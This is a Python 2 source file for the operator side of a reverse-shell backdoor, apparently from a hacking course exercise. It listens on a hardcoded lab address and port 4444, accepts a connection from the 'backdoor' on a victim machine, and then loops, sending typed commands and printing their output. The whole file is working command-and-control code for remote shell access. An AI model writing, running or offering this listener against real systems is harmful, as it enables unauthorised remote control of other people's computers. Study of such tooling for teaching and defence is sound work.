import socket


class Listener:
    # Listen incoming connection
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # In case connection drop, retrieve it
        listener.bind((ip, port))
        listener.listen(0)  # the number of connection that can be queued
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()  # accept() -> (socket object, address info)
        print("[+] Got a connection from " + str(address))

    # Send command remotely and receives its output
    def execute_remotely(self, command):
        self.connection.send(command)  # Sending command to backdoor
        return self.connection.recv(1024)  # Receiving output from backdoor

    # Take input
    def run(self):
        while True:
            command = raw_input(">> ")
            result = self.execute_remotely(command)
            print(result)


my_listener = Listener("192.168.190.140", 4444)
my_listener.run()
